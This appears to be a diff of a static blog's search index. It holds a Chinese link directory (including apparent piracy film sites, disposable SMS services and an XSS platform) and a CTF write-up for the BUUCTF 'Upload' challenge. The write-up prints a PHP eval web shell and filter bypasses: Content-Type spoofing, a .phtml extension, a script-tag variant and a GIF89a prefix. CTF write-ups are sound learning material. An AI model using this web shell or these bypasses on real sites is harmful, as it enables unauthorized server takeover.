+<td></td>
+</tr>
+<tr>
+<td>阿里云开发社区</td>
+<td><a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td><a href="https://cloud.tencent.com/">https://cloud.tencent.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>腾讯云开发者手册</td>
+<td><a href="https://cloud.tencent.com/developer/devdocs">https://cloud.tencent.com/developer/devdocs</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="办公"><a href="#办公" class="headerlink" title="办公"></a>办公</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>QQ邮箱</td>
+<td><a href="https://mail.qq.com/cgi-bin/frame_html?sid=OGWazeSvPyvqARJP&amp;r=b393f645da6344b20e942babdc768d9f">https://mail.qq.com/cgi-bin/frame_html?sid=OGWazeSvPyvqARJP&amp;r=b393f645da6344b20e942babdc768d9f</a></td>
+<td></td>
+</tr>
+<tr>
+<td>吾道幻灯片</td>
+<td><a href="https://www.woodo.cn/?f=2388">https://www.woodo.cn/?f=2388</a></td>
+<td></td>
+</tr>
+<tr>
+<td>uzer</td>
+<td><a href="https://uzer.me/">https://uzer.me/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>hippter（PPT）</td>
+<td><a href="http://www.hippter.com/">http://www.hippter.com/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="影视"><a href="#影视" class="headerlink" title="影视"></a>影视</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>片库</td>
+<td><a href="https://www.pianku.li/">https://www.pianku.li/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>真不卡电影网</td>
+<td><a href="https://www.zhenbuka.com/">https://www.zhenbuka.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>电影雷达</td>
+<td><a href="http://m.dianyingleida.com/">http://m.dianyingleida.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>飘花影院</td>
+<td><a href="http://www.phyy1.com/">http://www.phyy1.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>学士爱解析</td>
+<td><a href="http://jiexi.xueshi.pro/">http://jiexi.xueshi.pro/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>聚BT</td>
+<td><a href="https://jubt.net/cn/index.html">https://jubt.net/cn/index.html</a></td>
+<td></td>
+</tr>
+<tr>
+<td>动漫</td>
+<td><a href="https://qinmei.video/">https://qinmei.video/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>蛋蛋赞影院</td>
+<td><a href="https://www.dandanzan.com/">https://www.dandanzan.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>电影狗</td>
+<td><a href="http://www.dianyinggou.com/linkNav/">http://www.dianyinggou.com/linkNav/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>VIP</td>
+<td><a href="http://vip.sb/">http://vip.sb/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="文库下载"><a href="#文库下载" class="headerlink" title="文库下载"></a>文库下载</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>南瓜文档</td>
+<td><a href="http://www.588230.com/#wenku">http://www.588230.com/#wenku</a></td>
+<td></td>
+</tr>
+<tr>
+<td>北斗百度文库下载</td>
+<td><a href="http://www.bdwenku.com/">http://www.bdwenku.com/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="社区"><a href="#社区" class="headerlink" title="社区"></a>社区</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>哔哩哔哩</td>
+<td><a href="https://www.bilibili.com/">https://www.bilibili.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>微云</td>
+<td><a href="https://www.weiyun.com/">https://www.weiyun.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>百度云</td>
+<td><a href="https://pan.baidu.com/">https://pan.baidu.com</a></td>
+<td></td>
+</tr>
+<tr>
+<td>蓝奏云</td>
+<td><a href="https://lanzou.com/">https://lanzou.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>知乎</td>
+<td><a href="https://www.zhihu.com/">https://www.zhihu.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>虎牙</td>
+<td><a href="https://www.huya.com/">https://www.huya.com/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>路过图床</td>
+<td><a href="https://imgchr.com/">https://imgchr.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>聚合图床</td>
+<td><a href="https://www.superbed.cn/">https://www.superbed.cn/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>油猴</td>
+<td><a href="https://greasyfork.org/zh-CN">https://greasyfork.org/zh-CN</a></td>
+<td></td>
+</tr>
+<tr>
+<td>插件</td>
+<td><a href="https://www.extfans.com/">https://www.extfans.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>云短信</td>
+<td><a href="https://www.materialtools.com/">https://www.materialtools.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>临时邮箱</td>
+<td><a href="https://10minutemail.net/">https://10minutemail.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>云短信2</td>
+<td><a href="https://yunduanxin.net/">https://yunduanxin.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>PDF转</td>
+<td><a href="https://www.cleverpdf.com/cn">https://www.cleverpdf.com/cn</a></td>
+<td></td>
+</tr>
+<tr>
+<td>PDF</td>
+<td><a href="https://lightpdf.cn/">https://lightpdf.cn/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>alltoall</td>
+<td><a href="https://www.alltoall.net/">https://www.alltoall.net/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="靶场-渗透"><a href="#靶场-渗透" class="headerlink" title="靶场  渗透"></a>靶场  渗透</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>i春秋</td>
+<td><a href="https://www.ichunqiu.com/battalion">https://www.ichunqiu.com/battalion</a></td>
+<td></td>
+</tr>
+<tr>
+<td>攻防世界</td>
+<td><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>Wechall</td>
+<td><a href="http://www.wechall.net/">http://www.wechall.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>Wargame</td>
+<td><a href="http://www.wargame.kr/">http://www.wargame.kr/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>渗透师</td>
+<td><a href="https://www.shentoushi.top/">https://www.shentoushi.top/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>小迪渗透</td>
+<td><a href="http://www.xiaodi8.com/">http://www.xiaodi8.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>MD5</td>
+<td><a href="https://www.somd5.com/">https://www.somd5.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>XSS平台</td>
+<td><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></td>
+<td></td>
+</tr>
+<tr>
+<td>sourceforge</td>
+<td><a href="https://sourceforge.net/">https://sourceforge.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>查IP</td>
+<td><a href="https://site.ip138.com/raw.githubusercontent.com/">https://site.ip138.com/raw.githubusercontent.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>BUUCTF</td>
+<td><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></td>
+<td></td>
+</tr>
+<tr>
+<td>Bugku</td>
+<td><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>Bugku</td>
+<td><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>Bugku</td>
+<td><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><table>
+<thead>
+<tr>
+<th>标题</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CSDN</td>
+<td><a href="https://www.csdn.net/">https://www.csdn.net/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>片库</td>
+<td><a href="https://www.pianku.li/">https://www.pianku.li/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>知乎</td>
+<td><a href="https://www.zhihu.com/">https://www.zhihu.com/</a></td>
+<td></td>
+</tr>
+<tr>
+<td>菜鸟</td>
+<td><a href="https://www.runoob.com/">https://www.runoob.com/</a></td>
+<td></td>
+</tr>
+</tbody></table>
+]]></content>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极客大挑战_2019 Upload</title>
+    <url>/2021/03/09/ji-ke-da-tiao-zhan-2019-upload/</url>
+    <content><![CDATA[<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>很明显是一个文件上传漏洞</p>
+<p>编辑一个文件<code>1.php</code></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'chopper'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
+<p>上传bp抓包</p>
+<p><img src="https://s3.ax1x.com/2021/03/09/61lBE8.png" alt="61lBE8.png"></p>
+<p>提示<code>Not image!</code>，修改Content-Type: image/jpeg</p>
+<p><img src="https://s3.ax1x.com/2021/03/09/61lyCQ.png" alt="61lyCQ.png"></p>
+<p><code>NOT PHP</code>,修改文件后缀名，经测试 <code>phtml</code>等通过</p>
+<p><img src="https://s3.ax1x.com/2021/03/09/61l5UU.png" alt="61l5UU.png"></p>
+<p>不能包含<code>&lt;?</code>,换一种写法 </p>
+<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'chopper'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre>
+<p><img src="https://s3.ax1x.com/2021/03/09/61l4ET.png" alt="61l4ET.png"></p>
+<p>还是没有image，可能检查了文件内容，加上gif的文件幻数，在PHP代码前加上GIF89a</p>
+<pre class=" language-php"><code class="language-php">GIF89a
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'chopper'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre>
+<p><img src="https://s3.ax1x.com/2021/03/09/61lgvn.png" alt="61lgvn.png"></p>
+<p>上传成功了，猜测文件在upload目录下<img src="https://s3.ax1x.com/2021/03/09/61lz5D.png" alt="61lz5D.png"></p>
+<p>用蚁剑连接，即可找到flag</p>
+<p><img src="https://s3.ax1x.com/2021/03/09/611pPe.png" alt="611pPe.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
 </search>
